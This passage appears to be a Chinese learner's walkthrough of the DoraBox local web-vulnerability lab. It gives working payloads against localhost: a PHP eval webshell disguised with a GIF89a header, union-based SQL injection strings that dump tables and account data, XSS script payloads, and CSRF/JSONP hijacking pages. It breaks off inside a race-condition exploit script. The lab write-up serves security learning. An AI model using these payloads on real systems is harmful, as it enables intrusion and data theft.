文件</td>\n<td>.tar</td>\n<td>application/x-tar</td>\n</tr>\n<tr>\n<td>任意的二进制数据</td>\n<td></td>\n<td>application/octet-stream</td>\n</tr>\n</tbody>\n</table>\n<p><strong>出现在 HTTP 数据包中可能有的位置（不是很有画面感…）：</strong></p>\n<blockquote>\n<p><strong>MIME 信息头有：</strong></p>\n<p>MIME-Version:</p>\n<p>这个头提供了所用 MIME 的版本号。这个值习惯上为 1.0。</p>\n<p><strong>Content-Type:</strong></p>\n<p>它定义了数据的类型，以便数据能被适当的处理。有效的类型有：text，image，audio，video，applications，multipart 和 message。注意任何一个二进制附件都应该被叫做 application/octet- stream。这个头的一些用例为：image/jpg, application/mswork，multipart/mixed，这只是很少的一部分。</p>\n<p><strong>Content-Transfer-Encoding:</strong></p>\n<p>这是所有头中最重要的一个，因为它说明了对数据所执行的编码方式，客户 / MUA 将用它对附件进行解码。对于每个附件，可以使用 7bit，8bit，binary ，quoted-printable，<a href=\"https://baike.baidu.com/item/base64\">base64</a> 和 custom 中的一种编码方式。7bit 编码是用在 US ASCII<a href=\"https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6%E9%9B%86\"> 字符集</a>上的常用的一种编码方式，也就是，保持它的原样。8bit 和 binary 编码一般不用。对人类可读的标准文本，如果传输要经过对格式有影响的<a href=\"https://baike.baidu.com/item/%E7%BD%91%E5%85%B3\">网关</a>时对其进行保护，可以使用 quoted printable 。Base64 是一种通用方法，在需要决定使用哪一种编码方法时，它提供了一个不用费脑子的选择；它通常用在二进制，非文本数据上。注意，任何非 7bit 数据必须用一种模式编码，这样它就可以通过 Internet<a href=\"https://baike.baidu.com/item/%E9%82%AE%E4%BB%B6%E7%BD%91%E5%85%B3\"> 邮件网关</a>！</p>\n<p><strong>Content-ID:</strong></p>\n<p>如果 Content-Type 是 message/external-body 或 multipart/alternative 时，这个头就有用了，它超出了本文的范围。</p>\n<h3 id=\"content-description\"><a class=\"markdownIt-Anchor\" href=\"#content-description\">#</a> Content-Description:</h3>\n<p>这是一个可选的头。它是任何信息段内容的自由文本描述。描述必须使用 us-ascii 码。</p>\n<p><strong>Content-Disposition:</strong></p>\n<p>一个试验性的头，它用于给客户程序 / MUA 提供提示，来决定是否在行内显示附件或作为单独的附件。</p>\n<p>MIME 段头（出现在实际的 MIME 附件部分的头），除了 MIME-Version 头，可以拥有以上任何头字段。如果一个 MIME 头是信息块的一部分，它将作用于整个信息体。例如，如果 Content-Transfer-Encoding 显示在信息（指整个信息）头中，它应用于整个信息体，但是如果它显示在一个 MIME 段里，它 &quot;只能&quot; 用于那个段中。</p>\n<p>注意：其可以对自动对收到的<a href=\"https://baike.baidu.com/item/%E9%82%AE%E4%BB%B6\">邮件</a>进行解密。</p>\n</blockquote>\n<p>[以上拓展来自这里</p>\n<h1 id=\"拓展名限制文件上传\"><a class=\"markdownIt-Anchor\" href=\"#拓展名限制文件上传\">#</a> 拓展名限制文件上传</h1>\n<p>后台进行了文件名后缀过滤，无法上传.php 文件</p>\n<h2 id=\"过程-6\"><a class=\"markdownIt-Anchor\" href=\"#过程-6\">#</a> 过程：</h2>\n<ol>\n<li>尝试大小写绕过，把文件名后缀改为.phP，上传成功，菜刀直连<img src=\"dorabox_fp_hz001.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-6\"><a class=\"markdownIt-Anchor\" href=\"#总结-6\">#</a> 总结：</h2>\n<p>因为写过 upload_labs (没写完)，就有思路</p>\n<h1 id=\"内容限制文件上传\"><a class=\"markdownIt-Anchor\" href=\"#内容限制文件上传\">#</a> 内容限制文件上传</h1>\n<p>对文件内容进行判读过滤</p>\n<h2 id=\"过程-7\"><a class=\"markdownIt-Anchor\" href=\"#过程-7\">#</a> 过程：</h2>\n<ol>\n<li>\n<p>在木马文件最前面加上 GIF89a:</p>\n<p><code>GIF89a &lt;?php @eval($_POST['attack']) ?&gt;</code></p>\n</li>\n<li>\n<p>上传成功，路径告诉了，菜刀直连</p>\n</li>\n</ol>\n<p><img src=\"dorabox_fp_nr001.png\" alt=\"\"></p>\n<h2 id=\"总结-7\"><a class=\"markdownIt-Anchor\" href=\"#总结-7\">#</a> 总结：</h2>\n<p>GIF89a 是文件头校验内容，服务器看到这里就会以为是 GIF 文件。</p>\n<p>常见的文件头对应关系（入职培训上的，这个我以前还找过，就是因为菜，没有找到）：</p>\n<ol>\n<li>JPEG;.JPE;.JPG，”JPGGraphic File”</li>\n<li>gif，”GIF 89A”</li>\n<li>zip，”Zip Compressed”</li>\n<li>doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</li>\n</ol>\n<h1 id=\"sqli数字手工注入\"><a class=\"markdownIt-Anchor\" href=\"#sqli数字手工注入\">#</a> SQLi 数字手工注入</h1>\n<p><img src=\"dorabox_sqlnum001.png\" alt=\"\"></p>\n<h2 id=\"过程-8\"><a class=\"markdownIt-Anchor\" href=\"#过程-8\">#</a> 过程：</h2>\n<ol>\n<li>\n<p>输出报错：</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php?id=1\">http://localhost/dorabox/sql_injection/sql_num.php?id=1</a> order by 4 &amp;submit=submit<img src=\"dorabox_sqlnum007.png\" alt=\"\"> 正常输出：</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php\">http://localhost/dorabox/sql_injection/sql_num.php</a><br>\n?id=1 order by 3 &amp;submit=submit</p>\n<p>以上说明，应输出 3 个字段</p>\n</li>\n<li>\n<p>用 count (*) 统计表内数据，只有两条数据：</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php?id=3\">http://localhost/dorabox/sql_injection/sql_num.php?id=3</a> union select 10086,count(*),10087 from news order by 1 desc limit 1<br>\n&amp;submit=submit</p>\n<p><img src=\"dorabox_sqlnum002.png\" alt=\"\"></p>\n</li>\n<li>\n<p>爆数据库</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php\">http://localhost/dorabox/sql_injection/sql_num.php</a><br>\n?id=1 union select 3,database(),user() order by 1 desc limit 1<br>\n&amp;submit=submit<img src=\"dorabox_sqlnum003.png\" alt=\"\"></p>\n</li>\n<li>\n<p>爆表名，利用 group_concat ()：</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php?id=1\">http://localhost/dorabox/sql_injection/sql_num.php?id=1</a> union select 3,group_concat(table_name),0 from information_schema.tables where table_schema = database() order by 1 desc<br>\n&amp;submit=submit<img src=\"dorabox_sqlnum004.png\" alt=\"\"></p>\n</li>\n<li>\n<p>爆字段：</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php\">http://localhost/dorabox/sql_injection/sql_num.php</a><br>\n?id=1 union select 3,group_concat(column_name),0 from information_schema.columns where table_name = ‘account’ order by 1 desc<br>\n&amp;submit=submit<img src=\"dorabox_sqlnum005.png\" alt=\"\"></p>\n</li>\n<li>\n<p>爆内容：</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php\">http://localhost/dorabox/sql_injection/sql_num.php</a><br>\n?id = 1 union select 3,concat_ws(&quot;,&quot;,id,rest,own),0 from account where 1=1 order by 1 desc<img src=\"dorabox_sqlnum006.png\" alt=\"\"></p>\n</li>\n</ol>\n<h2 id=\"总结-8\"><a class=\"markdownIt-Anchor\" href=\"#总结-8\">#</a> 总结：</h2>\n<ul>\n<li>\n<p>mysql 字符拼接方法</p>\n<ol>\n<li>\n<p>concat()</p>\n<p>功能：将多个字符串连接成一个字符串</p>\n<p>语法：concat (str1, str2, …)</p>\n<p>说明：返回结果为连接参数产生的字符串，如果有任何一个参数为 null，则返回值为 null。</p>\n</li>\n<li>\n<p>concat_ws()</p>\n<p>功能：将多个字符串拼接成一个字符串，以自定义的符号进行分割</p>\n<p>语法：concat (separator, str1, str2, …)</p>\n<p>说明：第一个参数指定分隔符，若为 null, 返回结果也会为 null</p>\n</li>\n<li>\n<p>group_concat()</p>\n<p>功能：将 group by 产生的同一个分组中的值连接起来，返回一个字符串结果</p>\n<p>语法：group_concat ([distinct] 要连接的字段 [order by 排序字段 asc/desc] [separator ‘分隔符’] )</p>\n<p>说明：通过使用 distinct 可以排除重复值；如果希望对结果中的值进行排序，可以使用 order by 句子；separator 是一个字符串，缺省为一个逗号</p>\n</li>\n</ol>\n</li>\n<li>\n<p>information_schema</p>\n<p>information_schema 数据库是 MySQL 自带的，它提供了访问数据库元数据的方式。元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括 “数据词典” 和 “系统目录”。</p>\n<p>常用表：</p>\n<ol>\n<li>COLLATION_CHARACTER_SET_APPLICABILITY 表，和字符编码相关，包含的常用列：\n<ol>\n<li>COLLATION_NAME 排序规则明</li>\n<li>CHARACTER_SET_NAME 与排序规则关联的字符集的名称</li>\n</ol>\n</li>\n<li>TABLES 表，提供库中表信息，包含的常用列：\n<ol>\n<li>Table_catalog 数据表登记目录</li>\n<li>Table_schema 数据表所属的数据库名</li>\n<li>Table_name 表名</li>\n<li>Table_type 表类型 [system view | base table]</li>\n<li>Engine 使用的数据库引擎 [MyISAM | CSV | InnoDB]</li>\n<li>Version 版本，默认值 10</li>\n<li>Row_format 行格式 [Compact | Dynamic | Fixed]</li>\n<li>Table_rows 表里所存多少行数据 (早知道有这个，我就)</li>\n<li>Avg_row_length 平均行长度</li>\n<li>Data_length 数据长度</li>\n<li>Max_data_length 最大数据长度</li>\n<li>Index_length 索引长度</li>\n<li>Create_time 表的创建时间</li>\n<li>Update_time 表的更新时间</li>\n<li>Check_time 表的检查时间</li>\n<li>Table_collation 表的字符校验编码集</li>\n<li>Chechsum 校验和</li>\n</ol>\n</li>\n<li>COLUMNS 表，提供表中字段信息，包含的常用列：\n<ol>\n<li>TABLE_CATALOG 包含该列的表所属的目录名称。该值始终为 def。</li>\n<li>TABLE_SCHEMA 字段所在数据库的名称。</li>\n<li>TABLE_NAME 字段所在表的名称。</li>\n<li></li>\n<li>COLUMN_NAME 字段的名称。</li>\n<li>ORDINAL_POSITION 表中字段的位置。（可能会用 order by ORDINAL_POSITION）COLUMN_TYPE 字段数据类型。</li>\n<li>COLUMN_DEFAULT 字段的默认值。如果字段具有显示缺省值 NULL，或者字段定义不含 DEFAULT 子句，则该值为 NULL。</li>\n<li>COLUMN_TYPE 类型名称以及别的信息，比如精度或长度（以字符为单位</li>\n<li>CHARACTER_OCTET_LENGTH 对于字符串列，最大长度（以字节为单位</li>\n<li>CHARACTER_MAXIMUM_LENGTH 对于字符串列，最大长度（以字符为单位） COLUMN_KEY 名称是否已建立索引</li>\n</ol>\n</li>\n</ol>\n<h1 id=\"ssrf\"><a class=\"markdownIt-Anchor\" href=\"#ssrf\">#</a> SSRF</h1>\n<p><img src=\"dorabox_ssrf001.png\" alt=\"\"></p>\n<h2 id=\"过程-9\"><a class=\"markdownIt-Anchor\" href=\"#过程-9\">#</a> 过程：</h2>\n<ol>\n<li>利用 file 进行文件读取<img src=\"dorabox_ssrf002.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-9\"><a class=\"markdownIt-Anchor\" href=\"#总结-9\">#</a> 总结：</h2>\n<ul>\n<li>其实就是有 url 的，需要访问别的资源的就可能有 ssrf 漏洞。</li>\n<li>利用方式（里面好多没试过的，等我写完报告要去玩玩）\n<ol>\n<li>利用 file 协议读取本地文件（类似文件包含，想要利用这个漏洞，需要知道里面有什么文件或者目录，然后进行内容提取）</li>\n<li>对服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</li>\n<li>攻击运行在内网或本地的应用程序</li>\n<li>对内网 web 应用进行指纹识别，识别企业内部的资产信息</li>\n<li>攻击内外网的 web 应用，主要是使用 HTTP GET 请求就可以实现的攻击</li>\n</ol>\n</li>\n<li>一些的 url 中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"任意代码执行\"><a class=\"markdownIt-Anchor\" href=\"#任意代码执行\">#</a> 任意代码执行</h1>\n<p>根据题目提示，就是随便输代码，然后服务器执行脚本</p>\n<h2 id=\"过程-10\"><a class=\"markdownIt-Anchor\" href=\"#过程-10\">#</a> 过程：</h2>\n<ol>\n<li>phpinfo ()，查看 php 版本信息<img src=\"dorabox_code002.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-10\"><a class=\"markdownIt-Anchor\" href=\"#总结-10\">#</a> 总结：</h2>\n<p>代码执行漏洞就是通过执行脚本代码，进行渗透</p>\n<h1 id=\"任意命令执行\"><a class=\"markdownIt-Anchor\" href=\"#任意命令执行\">#</a> 任意命令执行</h1>\n<p>根据题目提示，就是随便输命令</p>\n<h2 id=\"过程-11\"><a class=\"markdownIt-Anchor\" href=\"#过程-11\">#</a> 过程：</h2>\n<ol>\n<li>whoami，查看服务器信息<img src=\"dorabox_cmd001.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-11\"><a class=\"markdownIt-Anchor\" href=\"#总结-11\">#</a> 总结：</h2>\n<p>看源码是利用 exec () 函数，直接调用操作系统的命令</p>\n<h1 id=\"反射xss\"><a class=\"markdownIt-Anchor\" href=\"#反射xss\">#</a> 反射 XSS</h1>\n<p>输入 12345678，查看源代码，发现服务器返回了输入的字符数统计，以及输入的字符串，在 html 中</p>\n<p><img src=\"dorabox_xss_ref001.png\" alt=\"\"></p>\n<h2 id=\"过程-12\"><a class=\"markdownIt-Anchor\" href=\"#过程-12\">#</a> 过程：</h2>\n<ol>\n<li>加入 js 代码，alert 一下<img src=\"dorabox_xss_ref002.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-12\"><a class=\"markdownIt-Anchor\" href=\"#总结-12\">#</a> 总结：</h2>\n<p>​\tXSS 反射型，就是通过 get 或者 post 请求，被后台处理过数据，并响应到前端页面上。可以通过使用白名单过滤掉输入的恶意字符进行修复。</p>\n<h1 id=\"存储型xss\"><a class=\"markdownIt-Anchor\" href=\"#存储型xss\">#</a> 存储型 XSS</h1>\n<p><img src=\"dorabox_xss_sav001.png\" alt=\"\"></p>\n<h2 id=\"过程-13\"><a class=\"markdownIt-Anchor\" href=\"#过程-13\">#</a> 过程：</h2>\n<ol>\n<li>alert 试一下</li>\n</ol>\n<figure class=\"highlight html\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">alert(<span class=\"string\">&quot;/XSS/&quot;</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"dorabox_xss_sav001.png\" alt=\"\"></p>\n<ol start=\"2\">\n<li>submit 后返回了字符数，没有 alert，刷新一下，重新加载，发现存储成功</li>\n</ol>\n<p><img src=\"dorabox_xss_sav002.png\" alt=\"\"></p>\n<h2 id=\"总结-13\"><a class=\"markdownIt-Anchor\" href=\"#总结-13\">#</a> 总结：</h2>\n<p>存储型就是把用户输入的恶意字符串存储在服务器（数据库），一般在可以存储数据并会返回到前端代码的地方搞吧，别的用户点了，就会跳到小黑屋这种。或者利用一些平台脚本搞事情。</p>\n<p>漏洞修复：在服务端过滤掉 HTML 的尖括号，比如 php 的自带函数 strip_tags ()，然后对于一些可以执行的函数进行手动写函数过滤，过滤掉 onchange (),onload (),onclick (),onerror () 等等函数</p>\n<h1 id=\"dom型xss\"><a class=\"markdownIt-Anchor\" href=\"#dom型xss\">#</a> DOM 型 XSS</h1>\n<p><img src=\"dorabox_xss_sav001.png\" alt=\"\"></p>\n<h2 id=\"过程-14\"><a class=\"markdownIt-Anchor\" href=\"#过程-14\">#</a> 过程：</h2>\n<ol>\n<li>\n<p>万能 alert，<script>alert(1)</script>：<img src=\"dorabox_xss_dom001.png\" alt=\"\"></p>\n<p>带有 xss 的 url：<a href=\"http://localhost/dorabox/xss/dom_xss.php?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;submit=submit\">http://localhost/dorabox/xss/dom_xss.php?name=&lt;script&gt;alert(1)&lt;%2Fscript&gt;&amp;submit=submit</a></p>\n</li>\n<li>\n<p>看源码是在这里打印的： <code>document.write(getURLValue('name'));</code></p>\n</li>\n</ol>\n<h2 id=\"总结-14\"><a class=\"markdownIt-Anchor\" href=\"#总结-14\">#</a> 总结：</h2>\n<p>DOM 型 xss，仅仅在前端页面进行操作的，通过修改页面的 DOM 节点形成的 XSS，效果和反射型类似。</p>\n<p>攻击者在 URL 中插入 XSS 代码，前端页面直接从 url 中获取 xss 代码并输出到页面，导致 xss 代码的执行，攻击者将带有 xss 代码的 url 发给用户，用户打开后收到攻击。</p>\n<h1 id=\"csrf跨域资源\"><a class=\"markdownIt-Anchor\" href=\"#csrf跨域资源\">#</a> CSRF 跨域资源</h1>\n<p><img src=\"dorabox_csrf_json001.png\" alt=\"\"></p>\n<h2 id=\"过程-15\"><a class=\"markdownIt-Anchor\" href=\"#过程-15\">#</a> 过程：</h2>\n<ol username:Vulkey_Chen,mobilephone:13188888888,email:admin@gh0st.cn,address:\\u4e2d\\u534e\\u4eba\\u6c11\\u5171\\u548c\\u56fd,sex:CoolMan=\"\">\n<li>\n<p>构造 html 来劫持</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Ajax<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>Ajax 发送 get 请求<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ajax</span>(<span class=\"params\"></span>) </span>&#123; </span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest();</span></span><br><span class=\"line\"><span class=\"javascript\">  xhr.responseType = <span class=\"string\">&quot;text&quot;</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  xhr.open(<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;http://localhost/dorabox/csrf/userinfo.php&#x27;</span>, <span class=\"literal\">true</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">  xhr.onreadystatechange= <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">e</span>) </span>&#123; </span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">this</span>.status == <span class=\"number\">200</span>)&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">\t\talert(<span class=\"built_in\">this</span>.responseText);</span></span><br><span class=\"line\"><span class=\"javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"javascript\"> &#125;;</span></span><br><span class=\"line\"><span class=\"javascript\">  xhr.send();</span></span><br><span class=\"line\"><span class=\"javascript\">&#125;</span></span><br><span class=\"line\"><span class=\"javascript\">ajax();</span></span><br><span class=\"line\"><span class=\"javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"dorabox_csrf_ky001.png\" alt=\"\">内容：</p>\n</li>\n</ol>\n<h2 id=\"总结-15\"><a class=\"markdownIt-Anchor\" href=\"#总结-15\">#</a> 总结：</h2>\n<pre><code>实话实说，这个就是借鉴网上的，解释一下js代码：\n\n自定义ajax()方法并执行，ajax内创建XMLHttpRequest对象，设置回应内容的类型为text。\n\n然后发送请求到服务器，其中 open(*method*,*url*,*async*)，第三个参数true为异步，异步 JavaScript 和 XML，XMLHttpRequest 对象如果要用于 AJAX 的话，其 open() 方法的 async 参数必须设置为 true。\n\nonreadystatechange：存储函数（或函数名），每当 readyState 属性改变时，就会调用该函数。readyState存有 XMLHttpRequest 的状态。从 0 到 4 发生变化。\n</code></pre>\n<ul>\n<li>\n<p>0: 请求未初始化</p>\n</li>\n<li>\n<p>1: 服务器连接已建立</p>\n</li>\n<li>\n<p>2: 请求已接收</p>\n</li>\n<li>\n<p>3: 请求处理中</p>\n</li>\n<li>\n<p>4: 请求已完成，且响应已就绪</p>\n<p>status\t<br>\n200: “OK”，404: 未找到页面</p>\n</li>\n</ul>\n<p>最后响应成功就 alert 返回的数据</p>\n<p>function ajax() {<br>\nvar xhr = new XMLHttpRequest();<br>\nxhr.responseType = “text”;<br>\nxhr.open(‘GET’, ‘<a href=\"http://localhost/dorabox/csrf/userinfo.php\">http://localhost/dorabox/csrf/userinfo.php</a>’, true);<br>\nxhr.onreadystatechange= function(e) {<br>\nif(this.status == 200){<br>\nalert(this.responseText);<br>\n}<br>\n};<br>\nxhr.send();<br>\n}<br>\najax();</p>\n<h1 id=\"jsonp劫持\"><a class=\"markdownIt-Anchor\" href=\"#jsonp劫持\">#</a> JSONP 劫持</h1>\n<p><img src=\"dorabox_csrf_json001.png\" alt=\"\"></p>\n<h2 id=\"过程-16\"><a class=\"markdownIt-Anchor\" href=\"#过程-16\">#</a> 过程：</h2>\n<ol>\n<li>\n<p>来一个 csrf 攻击代码</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>JSONP劫持测试<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span>&gt;</span><span class=\"javascript\"></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\">result</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"javascript\">        </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            alert(result.address);</span></span><br><span class=\"line\"><span class=\"javascript\">        &#125;</span></span><br><span class=\"line\"><span class=\"javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://localhost/dorabox/csrf/jsonp.php?callback=test&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"dorabox_csrf_json002.png\" alt=\"\"></p>\n</li>\n</ol>\n<h2 id=\"总结-16\"><a class=\"markdownIt-Anchor\" href=\"#总结-16\">#</a> 总结：</h2>\n<p>JSONP (JSON With Padding)，是一种特殊的 CSRF 攻击，目的是获取敏感数据，当 JSON 数据响应给网站时，浏览器立即会调用数组或者对象的构造函数。正是利用这一点，把构造方法替换成恶意代码，在构造方法中添加将 JSON 数据发送给第三方即攻击者的代码。</p>\n<p>没写过，第一次写，写完跨域好像又多懂了一点点（好像真的懂了，但是入职培训里写的有点详细），我写完这些要再多写几道题，来一点画面感。</p>\n<h1 id=\"任意文件包含\"><a class=\"markdownIt-Anchor\" href=\"#任意文件包含\">#</a> 任意文件包含</h1>\n<p><img src=\"dorabox_filein002.png\" alt=\"\"></p>\n<h2 id=\"过程-17\"><a class=\"markdownIt-Anchor\" href=\"#过程-17\">#</a> 过程：</h2>\n<ol>\n<li>直接文件包含，输出<img src=\"dorabox_filein003.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-17\"><a class=\"markdownIt-Anchor\" href=\"#总结-17\">#</a> 总结：</h2>\n<p>网上看了很多通关记录，可是大家都是直接包含，如果不是本地靶场，那是怎么知道路径以及文件名的呢？是不是要配合文件上传一起？</p>\n<h1 id=\"任意文件包含-2\"><a class=\"markdownIt-Anchor\" href=\"#任意文件包含-2\">#</a> 任意文件包含</h1>\n<p><img src=\"dorabox_filein002.png\" alt=\"\"></p>\n<h2 id=\"过程-18\"><a class=\"markdownIt-Anchor\" href=\"#过程-18\">#</a> 过程：</h2>\n<ol>\n<li>输入 1，发现限制在当前目录，但是不影响要用的文件，所以也是直接包含就可以了<img src=\"dorabox_filein004.png\" alt=\"\"><img src=\"dorabox_filein003.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-18\"><a class=\"markdownIt-Anchor\" href=\"#总结-18\">#</a> 总结：</h2>\n<p>…/ 应该可以突破把</p>\n<h1 id=\"条件竞争-支付\"><a class=\"markdownIt-Anchor\" href=\"#条件竞争-支付\">#</a> 条件竞争 - 支付</h1>\n<p>靶场出了点问题，页面报 php 语法错</p>\n<p>但是语法并没有出错，百度了说是 php 版本的问题，但是我基本每个版本都试过且重启了，但是没有解决</p>\n<p>不过反正这个题要写脚本，我也不太会，干脆跟着把 poc 撸了一遍</p>\n<h2 id=\"过程-19\"><a class=\"markdownIt-Anchor\" href=\"#过程-19\">#</a> 过程：</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> queue</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    